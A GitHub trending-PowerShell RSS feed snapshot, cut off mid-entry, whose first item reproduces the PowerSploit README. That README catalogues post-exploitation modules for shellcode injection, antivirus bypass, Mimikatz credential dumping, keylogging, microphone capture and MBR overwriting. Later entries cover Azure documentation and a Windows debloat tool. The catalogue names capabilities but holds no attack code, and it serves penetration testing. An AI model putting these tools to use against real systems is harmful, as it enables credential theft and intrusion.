<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub PowerShell Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-06-01T01:50:46Z</updated>
  <subtitle>Daily Trending of PowerShell in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>PowerShellMafia/PowerSploit</title>
    <updated>2022-06-01T01:50:46Z</updated>
    <id>tag:github.com,2022-06-01:/PowerShellMafia/PowerSploit</id>
    <link href="https://github.com/PowerShellMafia/PowerSploit" rel="alternate"></link>
    <summary type="html">&lt;p&gt;PowerSploit - A PowerShell Post-Exploitation Framework&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;This project is no longer supported&lt;/h2&gt; &#xA;&lt;h3&gt;PowerSploit is a collection of Microsoft PowerShell modules that can be used to aid penetration testers during all phases of an assessment. PowerSploit is comprised of the following modules and scripts:&lt;/h3&gt; &#xA;&lt;h2&gt;CodeExecution&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;Execute code on a target machine.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;h4&gt;&lt;code&gt;Invoke-DllInjection&lt;/code&gt;&lt;/h4&gt; &#xA;&lt;p&gt;Injects a Dll into the process ID of your choosing.&lt;/p&gt; &#xA;&lt;h4&gt;&lt;code&gt;Invoke-ReflectivePEInjection&lt;/code&gt;&lt;/h4&gt; &#xA;&lt;p&gt;Reflectively loads a Windows PE file (DLL/EXE) in to the powershell process, or reflectively injects a DLL in to a remote process.&lt;/p&gt; &#xA;&lt;h4&gt;&lt;code&gt;Invoke-Shellcode&lt;/code&gt;&lt;/h4&gt; &#xA;&lt;p&gt;Injects shellcode into the process ID of your choosing or within PowerShell locally.&lt;/p&gt; &#xA;&lt;h4&gt;&lt;code&gt;Invoke-WmiCommand&lt;/code&gt;&lt;/h4&gt; &#xA;&lt;p&gt;Executes a PowerShell ScriptBlock on a target computer and returns its formatted output using WMI as a C2 channel.&lt;/p&gt; &#xA;&lt;h2&gt;ScriptModification&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;Modify and/or prepare scripts for execution on a compromised machine.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;h4&gt;&lt;code&gt;Out-EncodedCommand&lt;/code&gt;&lt;/h4&gt; &#xA;&lt;p&gt;Compresses, Base-64 encodes, and generates command-line output for a PowerShell payload script.&lt;/p&gt; &#xA;&lt;h4&gt;&lt;code&gt;Out-CompressedDll&lt;/code&gt;&lt;/h4&gt; &#xA;&lt;p&gt;Compresses, Base-64 encodes, and outputs generated code to load a managed dll in memory.&lt;/p&gt; &#xA;&lt;h4&gt;&lt;code&gt;Out-EncryptedScript&lt;/code&gt;&lt;/h4&gt; &#xA;&lt;p&gt;Encrypts text files/scripts.&lt;/p&gt; &#xA;&lt;h4&gt;&lt;code&gt;Remove-Comment&lt;/code&gt;&lt;/h4&gt; &#xA;&lt;p&gt;Strips comments and extra whitespace from a script.&lt;/p&gt; &#xA;&lt;h2&gt;Persistence&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;Add persistence capabilities to a PowerShell script&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;h4&gt;&lt;code&gt;New-UserPersistenceOption&lt;/code&gt;&lt;/h4&gt; &#xA;&lt;p&gt;Configure user-level persistence options for the Add-Persistence function.&lt;/p&gt; &#xA;&lt;h4&gt;&lt;code&gt;New-ElevatedPersistenceOption&lt;/code&gt;&lt;/h4&gt; &#xA;&lt;p&gt;Configure elevated persistence options for the Add-Persistence function.&lt;/p&gt; &#xA;&lt;h4&gt;&lt;code&gt;Add-Persistence&lt;/code&gt;&lt;/h4&gt; &#xA;&lt;p&gt;Add persistence capabilities to a script.&lt;/p&gt; &#xA;&lt;h4&gt;&lt;code&gt;Install-SSP&lt;/code&gt;&lt;/h4&gt; &#xA;&lt;p&gt;Installs a security support provider (SSP) dll.&lt;/p&gt; &#xA;&lt;h4&gt;&lt;code&gt;Get-SecurityPackages&lt;/code&gt;&lt;/h4&gt; &#xA;&lt;p&gt;Enumerates all loaded security packages (SSPs).&lt;/p&gt; &#xA;&lt;h2&gt;AntivirusBypass&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;AV doesn&#39;t stand a chance against PowerShell!&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;h4&gt;&lt;code&gt;Find-AVSignature&lt;/code&gt;&lt;/h4&gt; &#xA;&lt;p&gt;Locates single Byte AV signatures utilizing the same method as DSplit from &#34;class101&#34;.&lt;/p&gt; &#xA;&lt;h2&gt;Exfiltration&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;All your data belong to me!&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;h4&gt;&lt;code&gt;Invoke-TokenManipulation&lt;/code&gt;&lt;/h4&gt; &#xA;&lt;p&gt;Lists available logon tokens. Creates processes with other users logon tokens, and impersonates logon tokens in the current thread.&lt;/p&gt; &#xA;&lt;h4&gt;&lt;code&gt;Invoke-CredentialInjection&lt;/code&gt;&lt;/h4&gt; &#xA;&lt;p&gt;Create logons with clear-text credentials without triggering a suspicious Event ID 4648 (Explicit Credential Logon).&lt;/p&gt; &#xA;&lt;h4&gt;&lt;code&gt;Invoke-NinjaCopy&lt;/code&gt;&lt;/h4&gt; &#xA;&lt;p&gt;Copies a file from an NTFS partitioned volume by reading the raw volume and parsing the NTFS structures.&lt;/p&gt; &#xA;&lt;h4&gt;&lt;code&gt;Invoke-Mimikatz&lt;/code&gt;&lt;/h4&gt; &#xA;&lt;p&gt;Reflectively loads Mimikatz 2.0 in memory using PowerShell. Can be used to dump credentials without writing anything to disk. Can be used for any functionality provided with Mimikatz.&lt;/p&gt; &#xA;&lt;h4&gt;&lt;code&gt;Get-Keystrokes&lt;/code&gt;&lt;/h4&gt; &#xA;&lt;p&gt;Logs keys pressed, time and the active window.&lt;/p&gt; &#xA;&lt;h4&gt;&lt;code&gt;Get-GPPPassword&lt;/code&gt;&lt;/h4&gt; &#xA;&lt;p&gt;Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.&lt;/p&gt; &#xA;&lt;h4&gt;&lt;code&gt;Get-GPPAutologon&lt;/code&gt;&lt;/h4&gt; &#xA;&lt;p&gt;Retrieves autologon username and password from registry.xml if pushed through Group Policy Preferences.&lt;/p&gt; &#xA;&lt;h4&gt;&lt;code&gt;Get-TimedScreenshot&lt;/code&gt;&lt;/h4&gt; &#xA;&lt;p&gt;A function that takes screenshots at a regular interval and saves them to a folder.&lt;/p&gt; &#xA;&lt;h4&gt;&lt;code&gt;New-VolumeShadowCopy&lt;/code&gt;&lt;/h4&gt; &#xA;&lt;p&gt;Creates a new volume shadow copy.&lt;/p&gt; &#xA;&lt;h4&gt;&lt;code&gt;Get-VolumeShadowCopy&lt;/code&gt;&lt;/h4&gt; &#xA;&lt;p&gt;Lists the device paths of all local volume shadow copies.&lt;/p&gt; &#xA;&lt;h4&gt;&lt;code&gt;Mount-VolumeShadowCopy&lt;/code&gt;&lt;/h4&gt; &#xA;&lt;p&gt;Mounts a volume shadow copy.&lt;/p&gt; &#xA;&lt;h4&gt;&lt;code&gt;Remove-VolumeShadowCopy&lt;/code&gt;&lt;/h4&gt; &#xA;&lt;p&gt;Deletes a volume shadow copy.&lt;/p&gt; &#xA;&lt;h4&gt;&lt;code&gt;Get-VaultCredential&lt;/code&gt;&lt;/h4&gt; &#xA;&lt;p&gt;Displays Windows vault credential objects including cleartext web credentials.&lt;/p&gt; &#xA;&lt;h4&gt;&lt;code&gt;Out-Minidump&lt;/code&gt;&lt;/h4&gt; &#xA;&lt;p&gt;Generates a full-memory minidump of a process.&lt;/p&gt; &#xA;&lt;h4&gt;&lt;code&gt;Get-MicrophoneAudio&lt;/code&gt;&lt;/h4&gt; &#xA;&lt;p&gt;Records audio from system microphone and saves to disk&lt;/p&gt; &#xA;&lt;h2&gt;Mayhem&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;Cause general mayhem with PowerShell.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;h4&gt;&lt;code&gt;Set-MasterBootRecord&lt;/code&gt;&lt;/h4&gt; &#xA;&lt;p&gt;Proof of concept code that overwrites the master boot record with the message of your choice.&lt;/p&gt; &#xA;&lt;h4&gt;&lt;code&gt;Set-CriticalProcess&lt;/code&gt;&lt;/h4&gt; &#xA;&lt;p&gt;Causes your machine to blue screen upon exiting PowerShell.&lt;/p&gt; &#xA;&lt;h2&gt;Privesc&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;Tools to help with escalating privileges on a target.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;h4&gt;&lt;code&gt;PowerUp&lt;/code&gt;&lt;/h4&gt; &#xA;&lt;p&gt;Clearing house of common privilege escalation checks, along with some weaponization vectors.&lt;/p&gt; &#xA;&lt;h2&gt;Recon&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;Tools to aid in the reconnaissance phase of a penetration test.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;h4&gt;&lt;code&gt;Invoke-Portscan&lt;/code&gt;&lt;/h4&gt; &#xA;&lt;p&gt;Does a simple port scan using regular sockets, based (pretty) loosely on nmap.&lt;/p&gt; &#xA;&lt;h4&gt;&lt;code&gt;Get-HttpStatus&lt;/code&gt;&lt;/h4&gt; &#xA;&lt;p&gt;Returns the HTTP Status Codes and full URL for specified paths when provided with a dictionary file.&lt;/p&gt; &#xA;&lt;h4&gt;&lt;code&gt;Invoke-ReverseDnsLookup&lt;/code&gt;&lt;/h4&gt; &#xA;&lt;p&gt;Scans an IP address range for DNS PTR records.&lt;/p&gt; &#xA;&lt;h4&gt;&lt;code&gt;PowerView&lt;/code&gt;&lt;/h4&gt; &#xA;&lt;p&gt;PowerView is series of functions that performs network and Windows domain enumeration and exploitation.&lt;/p&gt; &#xA;&lt;h2&gt;Recon\Dictionaries&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;A collection of dictionaries used to aid in the reconnaissance phase of a penetration test. Dictionaries were taken from the following sources.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;admin.txt - &lt;a href=&#34;http://cirt.net/nikto2/&#34;&gt;http://cirt.net/nikto2/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;generic.txt - &lt;a href=&#34;http://sourceforge.net/projects/yokoso/files/yokoso-0.1/&#34;&gt;http://sourceforge.net/projects/yokoso/files/yokoso-0.1/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;sharepoint.txt - &lt;a href=&#34;http://www.stachliu.com/resources/tools/sharepoint-hacking-diggity-project/&#34;&gt;http://www.stachliu.com/resources/tools/sharepoint-hacking-diggity-project/&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;The PowerSploit project and all individual scripts are under the &lt;a href=&#34;https://raw.github.com/mattifestation/PowerSploit/master/LICENSE&#34;&gt;BSD 3-Clause license&lt;/a&gt; unless explicitly noted otherwise.&lt;/p&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;p&gt;Refer to the comment-based help in each individual script for detailed usage information.&lt;/p&gt; &#xA;&lt;p&gt;To install this module, drop the entire PowerSploit folder into one of your module directories. The default PowerShell module paths are listed in the $Env:PSModulePath environment variable.&lt;/p&gt; &#xA;&lt;p&gt;The default per-user module path is: &#34;$Env:HomeDrive$Env:HOMEPATH\Documents\WindowsPowerShell\Modules&#34; The default computer-level module path is: &#34;$Env:windir\System32\WindowsPowerShell\v1.0\Modules&#34;&lt;/p&gt; &#xA;&lt;p&gt;To use the module, type &lt;code&gt;Import-Module PowerSploit&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;To see the commands imported, type &lt;code&gt;Get-Command -Module PowerSploit&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;If you&#39;re running PowerShell v3 and you want to remove the annoying &#39;Do you really want to run scripts downloaded from the Internet&#39; warning, once you&#39;ve placed PowerSploit into your module path, run the following one-liner: &lt;code&gt;$Env:PSModulePath.Split(&#39;;&#39;) | % { if ( Test-Path (Join-Path $_ PowerSploit) ) {Get-ChildItem $_ -Recurse | Unblock-File} }&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;For help on each individual command, Get-Help is your friend.&lt;/p&gt; &#xA;&lt;p&gt;Note: The tools contained within this module were all designed such that they can be run individually. Including them in a module simply lends itself to increased portability.&lt;/p&gt; &#xA;&lt;h2&gt;Contribution Rules&lt;/h2&gt; &#xA;&lt;p&gt;We need contributions! If you have a great idea for PowerSploit, we&#39;d love to add it. New additions will require the following:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The script must adhere to the style guide. Any exceptions to the guide line would need an explicit, valid reason.&lt;/li&gt; &#xA; &lt;li&gt;The module manifest needs to be updated to reflect the new function being added.&lt;/li&gt; &#xA; &lt;li&gt;A brief description of the function should be added to this README.md&lt;/li&gt; &#xA; &lt;li&gt;Pester tests must accompany all new functions. See the Tests folder for examples but we are looking for tests that at least cover the basics by testing for expected/unexpected input/output and that the function exhibits desired functionality. Make sure the function is passing all tests (preferably in mutiple OSes) prior to submitting a pull request. Thanks!&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Script Style Guide&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;For all contributors and future contributors to PowerSploit, I ask that you follow this style guide when writing your scripts/modules.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Avoid Write-Host &lt;strong&gt;at all costs&lt;/strong&gt;. PowerShell functions/cmdlets are not command-line utilities! Pull requests containing code that uses Write-Host will not be considered. You should output custom objects instead. For more information on creating custom objects, read these articles:&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;http://blogs.technet.com/b/heyscriptingguy/archive/2011/05/19/create-custom-objects-in-your-powershell-script.aspx&#34;&gt;http://blogs.technet.com/b/heyscriptingguy/archive/2011/05/19/create-custom-objects-in-your-powershell-script.aspx&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;http://technet.microsoft.com/en-us/library/ff730946.aspx&#34;&gt;http://technet.microsoft.com/en-us/library/ff730946.aspx&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;If you want to display relevant debugging information to the screen, use Write-Verbose. The user can always just tack on &#39;-Verbose&#39;.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Always provide descriptive, comment-based help for every script. Also, be sure to include your name and a BSD 3-Clause license (unless there are extenuating circumstances that prevent the application of the BSD license).&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Make sure all functions follow the proper PowerShell verb-noun agreement. Use Get-Verb to list the default verbs used by PowerShell. Exceptions to supported verbs will be considered on a case-by-case basis.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;I prefer that variable names be capitalized and be as descriptive as possible.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Provide logical spacing in between your code. Indent your code to make it more readable.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;If you find yourself repeating code, write a function.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Catch all anticipated errors and provide meaningful output. If you have an error that should stop execution of the script, use &#39;Throw&#39;. If you have an error that doesn&#39;t need to stop execution, use Write-Error.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;If you are writing a script that interfaces with the Win32 API, try to avoid compiling C# inline with Add-Type. Try to use the PSReflect module, if possible.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Do not use hardcoded paths. A script should be useable right out of the box. No one should have to modify the code unless they want to.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;PowerShell v2 compatibility is highly desired.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Use positional parameters and make parameters mandatory when it makes sense to do so. For example, I&#39;m looking for something like the following:&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;[Parameter(Position = 0, Mandatory = $True)]&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Don&#39;t use any aliases unless it makes sense for receiving pipeline input. They make code more difficult to read for people who are unfamiliar with a particular alias.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Try not to let commands run on for too long. For example, a pipeline is a natural place for a line break.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Don&#39;t go overboard with inline comments. Only use them when certain aspects of the code might be confusing to a reader.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Rather than using Out-Null to suppress unwanted/irrelevant output, save the unwanted output to $null. Doing so provides a slight performance enhancement.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Use default values for your parameters when it makes sense. Ideally, you want a script that will work without requiring any parameters.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;If a script creates complex custom objects, include a ps1xml file that will properly format the object&#39;s output.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>MicrosoftDocs/azure-docs</title>
    <updated>2022-06-01T01:50:46Z</updated>
    <id>tag:github.com,2022-06-01:/MicrosoftDocs/azure-docs</id>
    <link href="https://github.com/MicrosoftDocs/azure-docs" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Open source documentation of Microsoft Azure&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Microsoft Azure Documentation&lt;/h1&gt; &#xA;&lt;p&gt;Welcome to the open-source &lt;a href=&#34;https://raw.githubusercontent.com/MicrosoftDocs/azure-docs/main/azure&#34;&gt;documentation&lt;/a&gt; of &lt;a href=&#34;https://azure.microsoft.com&#34;&gt;Microsoft Azure&lt;/a&gt;. Please review this README file to understand how you can assist in contributing to the Microsoft Azure documentation.&lt;/p&gt; &#xA;&lt;h2&gt;Getting Started&lt;/h2&gt; &#xA;&lt;p&gt;Contributing to open source is more than just providing updates, it&#39;s also about letting us know when there is an issue. Read our &lt;a href=&#34;https://raw.githubusercontent.com/MicrosoftDocs/azure-docs/main/CONTRIBUTING.md&#34;&gt;Contributing guidance&lt;/a&gt; to find out more.&lt;/p&gt; &#xA;&lt;h3&gt;Prerequisites&lt;/h3&gt; &#xA;&lt;p&gt;You&#39;ve decided to contribute, that&#39;s great! To contribute to the documentation, you need a few tools.&lt;/p&gt; &#xA;&lt;p&gt;Contributing to the documentation requires a GitHub account. If you don&#39;t have an account, follow the instructions for the &lt;a href=&#34;https://raw.githubusercontent.com/MicrosoftDocs/azure-docs/main/contribute/get-started-setup-github&#34;&gt;GitHub account setup&lt;/a&gt; from our contributor guide.&lt;/p&gt; &#xA;&lt;h4&gt;Download&lt;/h4&gt; &#xA;&lt;p&gt;Install the following tools:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://git-scm.com/download&#34;&gt;Git&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://code.visualstudio.com/Download&#34;&gt;Visual Studio Code&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://marketplace.visualstudio.com/items?itemName=docsmsft.docs-authoring-pack&#34;&gt;Docs Authoring Pack&lt;/a&gt; extension for Visual Studio Code&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Install&lt;/h4&gt; &#xA;&lt;p&gt;Follow the instructions provided in the &lt;a href=&#34;https://raw.githubusercontent.com/MicrosoftDocs/azure-docs/main/contribute/get-started-setup-tools&#34;&gt;Install content authoring tools&lt;/a&gt; from our contributor guide.&lt;/p&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;Please refer to &lt;a href=&#34;https://raw.githubusercontent.com/MicrosoftDocs/azure-docs/main/LICENSE&#34;&gt;LICENSE&lt;/a&gt;, &lt;a href=&#34;https://raw.githubusercontent.com/MicrosoftDocs/azure-docs/main/LICENSE-CODE&#34;&gt;LICENSE-CODE&lt;/a&gt; and &lt;a href=&#34;https://raw.githubusercontent.com/MicrosoftDocs/azure-docs/main/ThirdPartyNotices.md&#34;&gt;ThirdPartyNotices&lt;/a&gt; for all Licensing information.&lt;/p&gt; &#xA;&lt;h2&gt;Code of Conduct&lt;/h2&gt; &#xA;&lt;p&gt;This project has adopted the &lt;a href=&#34;https://opensource.microsoft.com/codeofconduct/&#34;&gt;Microsoft Open Source Code of Conduct&lt;/a&gt;. For more information, see the &lt;a href=&#34;https://opensource.microsoft.com/codeofconduct/faq/&#34;&gt;Code of Conduct FAQ&lt;/a&gt; or contact &lt;a href=&#34;mailto:opencode@microsoft.com&#34;&gt;opencode@microsoft.com&lt;/a&gt; with any additional questions or comments.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>LeDragoX/Win-10-Smart-Debloat-Tools</title>
    <updated>2022-06-01T01:50:46Z</updated>
    <id>tag:github.com,2022-06-01:/LeDragoX/Win-10-Smart-Debloat-Tools</id>
    <link href="https://github.com/LeDragoX/Win-10-Smart-Debloat-Tools" rel="alternate"></link>
    <summary type="html">&lt;p&gt;These scripts will Customize, Debloat and Improve Privacy/Performance and System Responsiveness on Windows 10+.&lt;/p&gt;&lt;hr&gt;&lt;h1 align=&#34;center&#34;&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/LeDragoX/Win-10-Smart-Debloat-Tools/actions/workflows/powershell-linter.yml&#34;&gt;&lt;img src=&#34;https://github.com/LeDragoX/Win-10-Smart-Debloat-Tools/actions/workflows/powershell-linter.yml/badge.svg?style=flat&#34; alt=&#34;PSScriptAnalyzer&#34;&gt;&lt;/a&gt; &lt;img src=&#34;https://img.shields.io/github/issues/LeDragoX/Win-10-Smart-Debloat-Tools?label=Issues&#34; alt=&#34;GitHub issues&#34;&gt; &lt;img src=&#34;https://img.shields.io/github/license/LeDragoX/Win-10-Smart-Debloat-Tools?color=blue&amp;amp;label=License&#34; alt=&#34;GitHub&#34;&gt; &lt;a href=&#34;https://github.com/LeDragoX/Win-10-Smart-Debloat-Tools/commits/master&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/commit-activity/m/LeDragoX/Win-10-Smart-Debloat-Tools?label=Commits&#34; alt=&#34;Commit rate&#34;&gt;&lt;/a&gt; &lt;img src=&#34;https://img.shields.io/github/last-commit/LeDragoX/Win-10-Smart-Debloat-Tools/main?label=Last%20commit&#34; alt=&#34;GitHub last commit (branch)&#34;&gt; &lt;img src=&#34;https://img.shields.io/github/languages/code-size/LeDragoX/Win-10-Smart-Debloat-Tools?label=Code%20size&#34; alt=&#34;GitHub code size in bytes&#34;&gt;&lt;/p&gt; &lt;/h1&gt; &#xA;&lt;h1 align=&#34;center&#34;&gt; &lt;img width=&#34;30px&#34; src=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/assets/windows-11-logo.png&#34; style=&#34;vertical-align: bottom&#34;&gt; Win 10+ Smart Debloat Tools &lt;img width=&#34;30px&#34; src=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/assets/powershell-icon.png&#34; style=&#34;vertical-align: bottom&#34;&gt; &lt;/h1&gt; &#xA;&lt;h2 align=&#34;center&#34;&gt;This Project was adapted from &lt;a href=&#34;https://github.com/W4RH4WK/Debloat-Windows-10&#34;&gt;W4RH4WK&#39;s Project&lt;/a&gt;&lt;/h2&gt; &#xA;&lt;h2&gt;📄 Resume&lt;/h2&gt; &#xA;&lt;p&gt;These scripts will Customize, Debloat and Improve Privacy/Performance and System Responsiveness on Windows 10+.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;&lt;em&gt;Use on a fresh windows install to note the differences.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;⚠️ &lt;strong&gt;Disclaimer:&lt;/strong&gt; You&#39;re doing this at your own risk, I am not responsible for any data loss or damage that may occur.&lt;/p&gt; &#xA;&lt;h2&gt;🚀 Download Latest Version&lt;/h2&gt; &#xA;&lt;p&gt;Code located in the &lt;code&gt;main&lt;/code&gt; branch is considered stable, the &lt;code&gt;develop&lt;/code&gt; branch is the most recent version.&lt;/p&gt; &#xA;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;table&gt; &#xA;  &lt;thead align=&#34;center&#34;&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;th&gt;Download&lt;/th&gt; &#xA;    &lt;th&gt;Version(s) Supported&lt;/th&gt; &#xA;    &lt;th&gt;Edition(s)&lt;/th&gt; &#xA;    &lt;th&gt;PowerShell Version&lt;/th&gt; &#xA;   &lt;/tr&gt; &#xA;  &lt;/thead&gt; &#xA;  &lt;tbody align=&#34;center&#34;&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td align=&#34;left&#34;&gt; &lt;h4&gt;&lt;a href=&#34;https://github.com/LeDragoX/Win-10-Smart-Debloat-Tools/archive/main.zip&#34;&gt;⬇️ Main - Stable&lt;/a&gt;&lt;/h4&gt; &lt;/td&gt; &#xA;    &lt;td rowspan=&#34;2&#34;&gt;21H2 or Older&lt;/td&gt; &#xA;    &lt;td rowspan=&#34;2&#34;&gt;Home / Pro&lt;/td&gt; &#xA;    &lt;td rowspan=&#34;2&#34;&gt;&lt;img width=&#34;20px&#34; src=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/assets/powershell-icon.png&#34; style=&#34;vertical-align: bottom&#34;&gt; v5.1+&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td align=&#34;left&#34;&gt; &lt;h5&gt;&lt;a href=&#34;https://github.com/LeDragoX/Win-10-Smart-Debloat-Tools/archive/develop.zip&#34;&gt;⬇️ Develop - Newer&lt;/a&gt;&lt;/h5&gt; &lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;  &lt;/tbody&gt; &#xA; &lt;/table&gt; &#xA;&lt;/div&gt; &#xA;&lt;h2&gt;🔄️ Roll-Back&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;If something breaks you can rely on:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;A restoration point;&lt;/li&gt; &#xA; &lt;li&gt;The &lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/scripts/repair-windows.ps1&#34;&gt;&lt;code&gt;repair-windows.ps1&lt;/code&gt;&lt;/a&gt; file or button on &lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/Win10ScriptGUI.ps1&#34;&gt;&lt;code&gt;Win10ScriptGUI.ps1&lt;/code&gt;&lt;/a&gt;;&lt;/li&gt; &#xA; &lt;li&gt;If you want (almost) everything to it&#39;s original state, use the &lt;code&gt;Undo Tweaks&lt;/code&gt; button on &lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/Win10ScriptGUI.ps1&#34;&gt;&lt;code&gt;Win10ScriptGUI.ps1&lt;/code&gt;&lt;/a&gt;.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h2&gt;❗ Usage Requirements&lt;/h2&gt; &#xA;&lt;p&gt;The &lt;code&gt;Win10Script(CLI/GUI).ps1&lt;/code&gt; do not make everything automatically, follow these steps.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Extract the &lt;code&gt;.zip&lt;/code&gt; file.&lt;/li&gt; &#xA; &lt;li&gt;Open &lt;code&gt;OpenTerminalHere.cmd&lt;/code&gt; (For beginners) or the Powershell as admin on it&#39;s folder.&lt;/li&gt; &#xA; &lt;li&gt;Enable execution of PowerShell scripts and Unblock PowerShell scripts and modules within this directory (Down below).&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;&lt;strong&gt;GUI Version&lt;/strong&gt;&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Copy and Paste this entire line below on &lt;strong&gt;Powershell&lt;/strong&gt;:&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ps1&#34;&gt;Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force; ls -Recurse *.ps*1 | Unblock-File; .\&#34;Win10ScriptGUI.ps1&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/assets/script-gui.gif&#34; alt=&#34;Script GUI&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;The &lt;code&gt;Apply Tweaks&lt;/code&gt; button is the main one for debloating.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;strong&gt;CLI Version&lt;/strong&gt; (Minimal, good for automation)&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Copy and 